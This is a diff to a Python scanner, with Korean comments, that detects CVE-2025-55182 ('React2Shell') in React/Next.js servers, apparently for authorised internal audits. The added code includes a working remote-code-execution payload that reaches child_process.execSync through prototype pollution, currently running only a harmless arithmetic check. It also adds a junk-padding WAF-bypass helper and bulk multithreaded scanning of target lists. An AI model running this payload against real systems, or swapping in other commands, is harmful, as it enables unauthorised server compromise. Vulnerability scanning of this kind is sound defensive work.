@@ -3,10 +3,20 @@
 CVE-2025-55182 (React2Shell) 내부 시스템 취약점 확인 스크립트 (개선됨)
 용도: 내부 보안 점검용 (인가된 시스템만 대상으로 사용)
 
-개선사항:
-- React DevTools Hook 방식 사용 (domain-monitoring 방식)
-- React 19/Next.js 15, 16 취약 버전 정확 감지
-- 자바스크립트 기반 버전 탐지
+ 개선사항:
+ - React DevTools Hook 방식 사용 (domain-monitoring 방식)
+ - React 19/Next.js 15, 16 취약 버전 정확 감지
+ - 자바스크립트 기반 버전 탐지
+ - Safe-Check 모드 (Assetnote 방식)
+ - RCE 검증 모드 (Nuclei 방식)
+ - WAF 바이패스 지원
+ - rsc-action-id 헤더 검사
+ - Windows PowerShell 지원
+ - 리다이렉트 팔로우 지원
+
+참고: DevTools Hook 스크립트는 정의되어 있지만,
+        실제 브라우저 자동화 없이 HTML에서 정규식 패턴 매칭으로 버전을 탐지합니다.
+        Go chromedp 기반의 domain-monitoring과 달리 Python requests 라이브러리를 사용합니다.
 
 확인 항목:
   1. React/Next.js 버전 확인 (취약 버전 여부)
@@ -20,8 +30,11 @@ import os
 import json
 import re
 import urllib3
+import time
+import argparse
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
+from urllib.parse import urlparse
 
 # SSL 경고 무시 (내부망 자체서명 인증서 대응)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -170,6 +183,182 @@ def is_version_vulnerable(version, framework="react"):
     return False
 
 
+def check_safe_side_channel(url, timeout=10):
+    """
+    Assetnote-style Safe-Check 모드
+    실제 RCE 실행 없이 500 상태 코드 + 에러 digest로 취약점 확인
+    """
+    result = {
+        "url": url,
+        "method": "safe_check",
+        "vulnerable": False,
+        "status_code": None,
+        "error": None,
+        "indicators": []
+    }
+
+    try:
+        # Server Action 트리거용 간단한 페이로드
+        # 실제로는 아무것도 실행하지 않지만 RSC 파싱 과정에서 에러 발생
+        headers = {
+            "Next-Action": "a" * 40,
+            "User-Agent": "Mozilla/5.0 (Internal Security Scanner)"
+        }
+
+        resp = requests.post(
+            url,
+            headers=headers,
+            timeout=timeout,
+            verify=False
+        )
+
+        result["status_code"] = resp.status_code
+
+        # Safe-Check: 500 상태 코드 + RSC 에러 패턴
+        if resp.status_code == 500:
+            for pattern in RSC_INDICATORS["error_patterns"]:
+                if re.search(pattern, resp.text[:2000]):
+                    result["vulnerable"] = True
+                    result["indicators"].append("Safe-Check: 500 + RSC error pattern detected")
+                    break
+
+        if not result["vulnerable"] and resp.status_code != 404:
+            result["indicators"].append(f"Safe-Check: Received status {resp.status_code} (not 500)")
+
+    except Exception as e:
+        result["error"] = str(e)[:100]
+
+    return result
+
+
+def check_rce_exploit(url, timeout=10, platform="unix"):
+    """
+    Nuclei-style RCE 검증 모드
+    결정적 수학 연산(41*271=11111)으로 실제 RCE 실행 여부 확인
+    """
+    num1 = 41
+    num2 = 271
+    result_num = num1 * num2  # 11111
+
+    result = {
+        "url": url,
+        "method": "rce_verification",
+        "vulnerable": False,
+        "platform": platform,
+        "result": None,
+        "error": None,
+        "indicators": []
+    }
+
+    try:
+        # RCE 페이로드 (Nuclei/Assetnote 방식)
+        # $@ 청크 참조 + "status":"resolved_model" + process.mainModule.require
+        if platform == "windows":
+            cmd_payload = 'powershell -c "{num1}*{num2}"'.replace("{num1}", str(num1)).replace("{num2}", str(num2))
+        else:  # unix/linux
+            cmd_payload = 'echo $(({num1}*{num2}))'.replace("{num1}", str(num1)).replace("{num2}", str(num2))
+
+        payload = {
+            "then": "$1:__proto__:then",
+            "status": "resolved_model",
+            "reason": -1,
+            "value": '{"then":"$B1337"}',
+            "_response": {
+                "_prefix": 'var res=process.mainModule.require("child_process").execSync("' + cmd_payload + '").toString().trim();throw Object.assign(new Error("NEXT_REDIRECT"),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`}});',
+                "_chunks": "$Q2",
+                "_formData": {"get": "$1:constructor:constructor"}
+            }
+        }
+
+        headers = {
+            "Next-Action": "x",
+            "X-Nextjs-Request-Id": "test-" + str(int(time.time())),
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Internal Security Scanner)"
+        }
+
+        resp = requests.post(
+            url,
+            headers=headers,
+            json=payload,
+            timeout=timeout,
+            verify=False,
+            allow_redirects=False
+        )
+
+        # 리다이렉트 헤더 확인 (결과가 포함되어야 함)
+        x_action_redirect = resp.headers.get("X-Action-Redirect", "")
+
+        # 계산된 결과가 포함되어 있는지 확인
+        if str(result_num) in x_action_redirect:
+            result["vulnerable"] = True
+            result["result"] = result_num
+            result["indicators"].append(f"RCE Verified: Math operation {num1}*{num2}={result_num} successful")
+            result["indicators"].append(f"X-Action-Redirect: {x_action_redirect}")
+
+        # 다른 리다이렉트 응답도 체크
+        elif resp.status_code in [307, 308]:
+            location = resp.headers.get("Location", "")
+            if str(result_num) in location:
+                result["vulnerable"] = True
+                result["result"] = result_num
+                result["indicators"].append(f"RCE Verified: Math operation {num1}*{num2}={result_num} successful")
+                result["indicators"].append(f"Location: {location}")
+
+    except Exception as e:
+        result["error"] = str(e)[:100]
+
+    return result
+
+
+def add_waf_bypass(payload, size_kb=128):
+    """
+    WAF 바이패스 지원
+    128KB 정크 데이터를 앞에 추가하여 WAF 컨텐츠 검사 회피
+    """
+    junk_data = 'A' * (size_kb * 1024)
+    return junk_data + str(payload)
+
+
+def check_with_redirects(url, timeout=10):
+    """
+    리다이렉트 팔로우 지원
+    동일 호스트 리다이렉트를 따라 RSC 엔드포인트 발견
+    """
+
+    original_netloc = urlparse(url).netloc
+    result = {
+        "url": url,
+        "final_url": None,
+        "redirects": [],
+        "indicators": []
+    }
+
+    try:
+        resp = requests.get(
+            url,
+            timeout=timeout,
+            verify=False,
+            allow_redirects=True,
+            headers={"User-Agent": "Mozilla/5.0 (Internal Security Scanner)"}
+        )
+
+        result["final_url"] = resp.url
+
+        # 동일 호스트 리다이렉트인지 확인
+        if urlparse(resp.url).netloc == original_netloc:
+            result["indicators"].append(f"Same-host redirect: {url} -> {resp.url}")
+            # 실제 스캔은 리다이렉트된 URL로 수행 필요
+            result["rsc_target"] = resp.url
+        else:
+            result["indicators"].append("Redirected to different host (not following)")
+
+    except Exception as e:
+        result["error"] = str(e)[:100]
+
+    return result
+
+
 def extract_react_version_from_html(html):
     """HTML에서 React 버전 추출 (domain-monitoring 방식)"""
     version = None
@@ -261,16 +450,36 @@ def check_react_via_javascript(session, url, timeout=10):
     return results
 
 
-def check_rsc_endpoint(url, timeout=10):
-    """RSC 엔드포인트 존재 여부 확인"""
+def check_rsc_endpoint(url, timeout=10, safe_check=True, rce_verify=False, follow_redirects=False, platform="unix"):
+    """
+    RSC 엔드포인트 존재 여부 확인 (개선됨)
+
+    Args:
+        url: 타겟 URL
+        timeout: 요청 타임아웃
+        safe_check: Assetnote-style Safe-Check 모드 (기본값: True)
+        rce_verify: Nuclei-style RCE 검증 모드 (기본값: False)
+        follow_redirects: 리다이렉트 팔로우 (기본값: False)
+        platform: 플랫폼 - unix 또는 windows (RCE 검증용)
+    """
     results = {
         "url": url,
         "rsc_detected": False,
         "version_info": {},
         "indicators": [],
         "status": "unknown",
-        "error": None
+        "error": None,
+        "safe_check_result": None,
+        "rce_verify_result": None
     }
+
+    # 리다이렉트 팔로우 옵션 처리
+    scan_url = url
+    if follow_redirects:
+        redirect_result = check_with_redirects(url, timeout)
+        if "rsc_target" in redirect_result:
+            scan_url = redirect_result["rsc_target"]
+            results["indicators"].extend(redirect_result["indicators"])
 
     try:
         # 1. 기본 요청으로 Next.js/React 확인
@@ -307,50 +516,83 @@ def check_rsc_endpoint(url, timeout=10):
             if is_version_vulnerable(js_detection['nextjs_version'], "next"):
                 results["indicators"].append(f"VULNERABLE Next.js version: {js_detection['nextjs_version']}")
 
-        # 3. RSC 헤더로 요청 시도
+        if safe_check:
+            safe_result = check_safe_side_channel(scan_url, timeout)
+            results["safe_check_result"] = safe_result
+            if safe_result["vulnerable"]:
+                results["vulnerable"] = True
+                results["indicators"].extend(safe_result["indicators"])
+
+        if rce_verify:
+            rce_result = check_rce_exploit(scan_url, timeout, platform)
+            results["rce_verify_result"] = rce_result
+            if rce_result["vulnerable"]:
+                results["vulnerable"] = True
+                results["indicators"].extend(rce_result["indicators"])
+
         rsc_headers = {
             "RSC": "1",
             "Next-Router-State-Tree": "%5B%22%22%5D",
             "User-Agent": "Mozilla/5.0 (Internal Security Scanner)"
         }
 
+        rsc_action_id_headers = {
+            "rsc-action-id": "test",
+            "Next-Action": "test",
+            "User-Agent": "Mozilla/5.0 (Internal Security Scanner)"
+        }
+
         rsc_resp = requests.get(
-            url,
+            scan_url,
             headers=rsc_headers,
             timeout=timeout,
             verify=False
         )
 
-        # Content-Type 확인
+        rsc_action_id_resp = requests.get(
+            scan_url,
+            headers=rsc_action_id_headers,
+            timeout=timeout,
+            verify=False
+        )
+
         content_type = rsc_resp.headers.get("Content-Type", "")
         for ct in RSC_INDICATORS["content_types"]:
             if ct in content_type:
                 results["rsc_detected"] = True
                 results["indicators"].append(f"RSC Content-Type: {content_type}")
 
-        # 응답 패턴 확인
         for pattern in RSC_INDICATORS["response_patterns"]:
             if re.search(pattern, rsc_resp.text[:100]):
                 results["rsc_detected"] = True
                 results["indicators"].append("RSC Flight protocol response detected")
                 break
 
-        # RSC 에러 패턴 확인 (domain-monitoring 방식)
         for pattern in RSC_INDICATORS["error_patterns"]:
             if re.search(pattern, rsc_resp.text[:2000]):
                 results["rsc_detected"] = True
                 results["indicators"].append("RSC error response detected")
                 break
 
-        # 4. /_next/static 에서 빌드 정보 추출 시도 (개선됨)
-        build_manifest_url = url.rstrip('/') + "/_next/static/chunks/webpack.js"
+        for pattern in RSC_INDICATORS["response_patterns"]:
+            if re.search(pattern, rsc_action_id_resp.text[:100]):
+                results["rsc_detected"] = True
+                results["indicators"].append("rsc-action-id header response detected")
+                break
+
+        for pattern in RSC_INDICATORS["error_patterns"]:
+            if re.search(pattern, rsc_action_id_resp.text[:2000]):
+                results["rsc_detected"] = True
+                results["indicators"].append("rsc-action-id error response detected")
+                break
+
+        build_manifest_url = scan_url.rstrip('/') + "/_next/static/chunks/webpack.js"
         try:
             manifest_resp = requests.get(
                 build_manifest_url,
                 timeout=5,
                 verify=False
             )
-            # 버전 패턴 매칭 (domain-monitoring 방식)
             version_match = re.search(r'next[/\\](\d+\.\d+\.\d+)', manifest_resp.text)
             if version_match:
                 next_version = version_match.group(1)
@@ -385,13 +627,13 @@ def check_rsc_endpoint(url, timeout=10):
     return results
 
 
-def scan_targets(targets, max_workers=10):
+def scan_targets(targets, max_workers=10, safe_check=True, rce_verify=False, follow_redirects=False, platform="unix"):
     """여러 대상 동시 스캔"""
     results = []
 
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
         future_to_url = {
-            executor.submit(check_rsc_endpoint, url): url
+            executor.submit(check_rsc_endpoint, url, 10, safe_check, rce_verify, follow_redirects, platform): url
             for url in targets
         }
 
@@ -487,7 +729,84 @@ def generate_report(results, output_file=None):
     return report
 
 
+def parse_arguments():
+    parser = argparse.ArgumentParser(
+        description="CVE-2025-55182 (React2Shell) 취약점 스캐너 - 개선됨",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+예제:
+  %(prog)s https://example.com
+  %(prog)s urls.txt --rce-verify
+  %(prog)s https://target.com --platform windows --follow-redirects
+  %(prog)s urls.txt -o results.json -t 20
+        """
+    )
+
+    parser.add_argument(
+        "targets",
+        nargs="+",
+        help="타겟 URL 또는 URL 목록 파일"
+    )
+
+    parser.add_argument(
+        "-o", "--output",
+        help="JSON 결과 파일 경로"
+    )
+
+    parser.add_argument(
+        "-t", "--threads",
+        type=int,
+        default=10,
+        help="멀티스레드 수 (기본값: 10)"
+    )
+
+    parser.add_argument(
+        "--timeout",
+        type=int,
+        default=10,
+        help="타임아웃 초 (기본값: 10)"
+    )
+
+    parser.add_argument(
+        "-q", "--quiet",
+        action="store_true",
+        help="간략 출력 모드"
+    )
+
+    parser.add_argument(
+        "--safe-check",
+        action="store_true",
+        default=True,
+        help="Assetnote-style Safe-Check 모드 (기본값: 활성화)"
+    )
+
+    parser.add_argument(
+        "--rce-verify",
+        action="store_true",
+        default=False,
+        help="Nuclei-style RCE 검증 모드 (기본값: 비활성화)"
+    )
+
+    parser.add_argument(
+        "--platform",
+        choices=["unix", "windows"],
+        default="unix",
+        help="플랫폼 선택 (기본값: unix)"
+    )
+
+    parser.add_argument(
+        "--follow-redirects",
+        action="store_true",
+        default=False,
+        help="리다이렉트 팔로우 (기본값: 비활성화)"
+    )
+
+    return parser.parse_args()
+
+
 def main():
+    args = parse_arguments()
+
     print("""
 ╔═══════════════════════════════════════════════════════════════╗
 ║  CVE-2025-55182 (React2Shell) 내부 시스템 취약점 스캐너      ║
@@ -496,56 +815,45 @@ def main():
 ╚═══════════════════════════════════════════════════════════════╝
     """)
 
-    # 대상 URL 입력
-    if len(sys.argv) > 1:
-        targets = []
-        for arg in sys.argv[1:]:
-            # URL인지 파일인지 판단
-            if arg.startswith(('http://', 'https://')):
-                # URL 직접 입력
-                targets.append(arg)
-            elif os.path.isfile(arg):
-                # 파일에서 읽기
-                try:
-                    with open(arg, 'r', encoding='utf-8') as f:
-                        file_targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
-                        for url in file_targets:
-                            if not url.startswith(('http://', 'https://')):
-                                url = 'https://' + url
-                            targets.append(url)
-                except Exception as e:
-                    print(f"❌ 파일 읽기 오류 ({arg}): {e}")
-            else:
-                # http 없는 URL로 간주
-                targets.append('https://' + arg)
-    else:
-        print("대상 URL을 입력하세요 (한 줄에 하나, 빈 줄 입력 시 스캔 시작):")
-        targets = []
-        while True:
+    targets = []
+    for arg in args.targets:
+        if arg.startswith(('http://', 'https://')):
+            targets.append(arg)
+        elif os.path.isfile(arg):
             try:
-                line = input()
-                if line.strip():
-                    # URL 형식 보정
-                    url = line.strip()
-                    if not url.startswith(('http://', 'https://')):
-                        url = 'https://' + url
-                    targets.append(url)
-                else:
-                    break
-            except EOFError:
-                break
+                with open(arg, 'r', encoding='utf-8') as f:
+                    file_targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+                    for url in file_targets:
+                        if not url.startswith(('http://', 'https://')):
+                            url = 'https://' + url
+                        targets.append(url)
+            except Exception as e:
+                print(f"❌ 파일 읽기 오류 ({arg}): {e}")
+        else:
+            targets.append('https://' + arg)
 
     if not targets:
         print("❌ 스캔할 대상이 없습니다.")
         sys.exit(1)
 
-    print(f"\n🔍 {len(targets)}개 대상 스캔 시작...\n")
+    mode_info = []
+    if args.safe_check:
+        mode_info.append("Safe-Check")
+    if args.rce_verify:
+        mode_info.append("RCE 검증")
+    if args.follow_redirects:
+        mode_info.append("리다이렉트 팔로우")
+
+    mode_str = ", ".join(mode_info) if mode_info else "기본 모드"
+    platform_str = f" ({args.platform})" if args.rce_verify else ""
+
+    print(f"\n🔍 {len(targets)}개 대상 스캔 시작... [{mode_str}{platform_str}]\n")
 
     # 스캔 실행
-    results = scan_targets(targets)
+    results = scan_targets(targets, args.threads, args.safe_check, args.rce_verify, args.follow_redirects, args.platform)
 
     # 보고서 생성
-    output_file = f"react2shell_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+    output_file = args.output if args.output else f"react2shell_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
     generate_report(results, output_file)
 
     # 취약 시스템 있으면 종료 코드 1
